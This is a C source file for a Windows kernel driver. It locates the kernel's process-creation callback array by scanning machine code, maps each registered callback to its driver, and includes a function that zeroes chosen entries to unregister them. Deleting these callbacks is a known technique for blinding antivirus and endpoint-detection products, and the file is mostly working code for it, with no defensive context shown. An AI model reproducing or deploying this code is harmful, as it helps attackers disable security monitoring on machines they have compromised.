#include "utils.h"



ModulesData* EnumProcRegisteredDrivers(UINT64 procNotifyArrayAddr) {
    ModulesData moduleInfo = { 0 };
    NTSTATUS status = STATUS_SUCCESS;
    UINT64 callbackAddr = 0;
    UINT64 tmpPtr = 0;
    //LPVOID* 

	ModulesDataArray result = { 0 };
	ModulesData* modules;

	modules = (ModulesData*)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(ModulesData) * 64, DRIVER_TAG);
    if (modules == NULL) {
        DbgPrintEx(0, 0, "[%s] ExAllocatePool2 failed\n", DRIVER_NAME);
        return NULL;
	}
	int modulesCount = 0;

    for (int i = 0; i < 64; i++) {
        tmpPtr = procNotifyArrayAddr + i * 8;
        callbackAddr = *(PUINT64)(tmpPtr);

        //callbackAddr = *(callbackAddr & 0xfffffffffffffff8); // Mask to get the actual address (for x64 systems)

        //DbgPrintEx(0, 0, "[%s] Process Notify Callback %d Address: 0x%llx\n", DRIVER_NAME, i, callbackAddr);

        if (callbackAddr && MmIsAddressValid((PVOID)callbackAddr)) {
            callbackAddr = *(PUINT64)(callbackAddr & 0xfffffffffffffff8); // Mask to get the actual address (for x64 systems)
            status = SearchModules(callbackAddr, &moduleInfo);
            if (NT_SUCCESS(status)) {
                //DbgPrintEx(0, 0, "[%s] Process Notify Callback %d: 0x%llx in module %s\n", DRIVER_NAME, i, callbackAddr, (PCSTR)moduleInfo.ModuleName);
				modules[modulesCount] = moduleInfo;
				modulesCount++;
            }
            //else {
            //    //DbgPrintEx(0, 0, "[%s] Process Notify Callback %d: 0x%llx in unknown module\n", DRIVER_NAME, i, callbackAddr);
            //}
        }
    }
    // print modules to double check

    for (int j = 0; j < modulesCount; j++) {
        DbgPrintEx(0, 0, "[%s] Found Module %d: %s at base address: 0x%llx\n",
            DRIVER_NAME,
            j,
            (PCSTR)modules[j].ModuleName,
            (ULONG64)modules[j].ModuleBase);
	}



	return modules;
}



UINT64 FindProcNotifyRoutineAddress(UINT64 kernelBase, NOTIFY_ROUTINE_TYPE callbackType) {
    UINT64 routineAddress = 0;
    UINT64 tempAddress = 0;
    UINT64 notifyArrayAddress = 0;
    UNICODE_STRING routineName;

    UNREFERENCED_PARAMETER(kernelBase);
    UNREFERENCED_PARAMETER(callbackType);

    RtlInitUnicodeString(&routineName, L"PsSetCreateProcessNotifyRoutine");


    routineAddress = (UINT64)MmGetSystemRoutineAddress(&routineName);
    if (!routineAddress) {
        DbgPrintEx(0, 0, "[%s] MmGetSystemRoutineAddress failed to get PsSetCreateProcessNotifyRoutine\n", DRIVER_NAME);
        return 0;
    }
    // PRATICAMENTE TROVIAMO LA CALL A PspSetCreateProcessNotifyRoutine. PsSetCreateProcessNotifyRoutine FA UNA CALL A PspSetCreateProcessNotifyRoutine CHE A SUA VOLTA FA UNA LEA CHE CARICA L'INDIRIZZO DELL'ARRAY DI CALLBACK IN R13
    for (int offset = 0; offset < 0x100; offset++) {
        unsigned char instruction = *((unsigned char*)(routineAddress + offset));
        if (instruction == 0xe9 || instruction == 0xe8) { // CALL or JMP
            LONG relativeOffset = *((LONG*)(routineAddress + offset + 1));

            tempAddress = routineAddress + offset + 5 + relativeOffset;
            break;
        }
    }
    if (!tempAddress) {
        DbgPrintEx(0, 0, "[%s] Failed to find call/jmp instruction in PsSetCreateProcessNotifyRoutine\n", DRIVER_NAME);
        return 0;
    }

    //effettivamente la prima lea di PspSetCreateProcessNotifyRoutine. carica in r13 l'indirizzo di PspCreateProcessNotifyRoutine

    for (int offset = 0; offset < 300; offset++) {
        unsigned char prefix = *((unsigned char*)(tempAddress + offset));
        if ((prefix == 0x48 || prefix == 0x4C) && (*(unsigned char*)(tempAddress + offset + 1) == 0x8D)) { // LEA
            LONG relativeOffset = *((LONG*)(tempAddress + offset + 3));

            notifyArrayAddress = tempAddress + offset + 7 + relativeOffset;
            break;
        }
    }

    return notifyArrayAddress;
}


NTSTATUS SearchModules(ULONG64 ModuleAddr, ModulesData* ModuleFound) {
    NTSTATUS status = STATUS_SUCCESS;
    ULONG modulesSize = 0;
    AUX_MODULE_EXTENDED_INFO* modules = NULL;
    ULONG numberOfModules = 0;

    // Step 1: Initialize the Auxiliary Kernel Library
    status = AuxKlibInitialize();
    if (!NT_SUCCESS(status))
    {
        DbgPrintEx(0, 0, "[%s] AuxKlibInitialize fail %d\n", DRIVER_NAME, status);
        return status;
    }

    ModulesData ModuleFound2 = *ModuleFound;
    // take info abt kernel drivers
    status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), NULL);

    if (!NT_SUCCESS(status) || modulesSize == 0) {
        DbgPrintEx(0, 0, "[%s] AuxKlibQueryModuleInformation failed to get size (0x%X)\n", DRIVER_NAME, status);
        return status;
    }

    numberOfModules = modulesSize / sizeof(AUX_MODULE_EXTENDED_INFO);

    modules = (AUX_MODULE_EXTENDED_INFO*)ExAllocatePool2(POOL_FLAG_PAGED, modulesSize, DRIVER_TAG);
    if (modules == NULL) {
        DbgPrintEx(0, 0, "[%s] ExAllocatePool2 failed\n", DRIVER_NAME);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    // Query module information into the allocated buffer
    status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), modules);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(0, 0, "[%s] AuxKlibQueryModuleInformation failed (0x%X)\n", DRIVER_NAME, status);
        ExFreePoolWithTag(modules, DRIVER_TAG);
        return status;
    }


    DbgPrintEx(0, 0, "[%s] Searching for module containing address: 0x%llx\n", DRIVER_NAME, ModuleAddr);
    for (ULONG i = 0; i < numberOfModules; i++) {
        //     DbgPrintEx(0, 0, "[%s] Module %d: %s at base address: 0x%llx, size: 0x%x\n",
        //         DRIVER_NAME,
        //         i,
        //         (PCSTR)&modules[i].FullPathName[modules[i].FileNameOffset],
        //         (ULONG64)modules[i].BasicInfo.ImageBase,
                 //modules[i].ImageSize);
        if ((ModuleAddr > (ULONG64)modules[i].BasicInfo.ImageBase) && (ModuleAddr < ((ULONG64)modules[i].BasicInfo.ImageBase + modules[i].ImageSize))) {
            //DbgPrintEx(0, 0, "[%s] Found module: %s at base address: 0x%llx\n",
            //    DRIVER_NAME,
            //    (PCSTR)&modules[i].FullPathName[modules[i].FileNameOffset],
            //    (ULONG64)modules[i].BasicInfo.ImageBase);


            strcpy(ModuleFound2.ModuleName, (CHAR*)(modules[i].FullPathName + modules[i].FileNameOffset));
			memcpy(&ModuleFound2.ModuleBase, &modules[i].BasicInfo.ImageBase, sizeof(ULONG64));
            *ModuleFound = ModuleFound2;

            DbgPrintEx(0, 0, "[%s] Module name: %s\n", DRIVER_NAME, ModuleFound2.ModuleName);
            ExFreePoolWithTag(modules, DRIVER_TAG);
            return status;
        }
    }

    ExFreePoolWithTag(modules, DRIVER_TAG);
    return status;

}


NTSTATUS DeleteProcNotifyEntry(ULONG64 procNotifyArrayAddr, int  indexToRemove) {
	*(ULONG64*)(procNotifyArrayAddr + indexToRemove * 8) = (ULONG64)0;
    if (*(ULONG64*)(procNotifyArrayAddr + indexToRemove * 8) == 0) {
        DbgPrintEx(0, 0, "[%s] Successfully removed entry at index %d\n", DRIVER_NAME, indexToRemove);
        return STATUS_SUCCESS;
    }
    else {
        DbgPrintEx(0, 0, "[%s] Failed to remove entry at index %d\n", DRIVER_NAME, indexToRemove);
        return STATUS_UNSUCCESSFUL;
	}
}

UINT64 FindKernelBase() {
    UNICODE_STRING functionName;
    PFN_ZwQuerySystemInformation querySysInfo;
    NTSTATUS status;
    ULONG requiredSize;
    SIZE_T allocationSize;
    UINT64 kernelBase = 0;
    PRTL_PROCESS_MODULES moduleInfo = NULL;

    RtlInitUnicodeString(&functionName, L"ZwQuerySystemInformation");

    // dynamically get the address of ZwQuerySystemInformation
    querySysInfo = (PFN_ZwQuerySystemInformation)MmGetSystemRoutineAddress(&functionName);

    if (!querySysInfo) {
        DbgPrintEx(0, 0, "[%s] MmGetSystemRoutineAddress failed to get ZwQuerySystemInformation\n", DRIVER_NAME);
        return kernelBase;
    }

    status = querySysInfo((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, NULL, 0, &requiredSize);

    if (status != STATUS_INFO_LENGTH_MISMATCH) {
        DbgPrintEx(0, 0, "[%s] ZwQuerySystemInformation failed to get size (0x%X)\n", DRIVER_NAME, status);
        return kernelBase;
    }

    allocationSize = requiredSize;
    while (status == STATUS_INFO_LENGTH_MISMATCH) {
        allocationSize += sizeof(ULONG);
        moduleInfo = (PRTL_PROCESS_MODULES)ExAllocatePool2(POOL_FLAG_NON_PAGED, allocationSize, 'Tag1');
        if (!moduleInfo) {
            DbgPrintEx(0, 0, "[%s] ExAllocatePool2 failed\n", DRIVER_NAME);
            return kernelBase;
        }
        status = querySysInfo((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, moduleInfo, (ULONG)allocationSize, &requiredSize);
        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            ExFreePoolWithTag(moduleInfo, 'Tag1');
            moduleInfo = NULL;
        }
    }
    if (!NT_SUCCESS(status)) {
        if (moduleInfo) {
            ExFreePoolWithTag(moduleInfo, 'Tag1');
        }
        return kernelBase;
    }
    kernelBase = (UINT64)moduleInfo->Modules[0].ImageBase;
    ExFreePoolWithTag(moduleInfo, 'Tag1');
    return kernelBase;
}
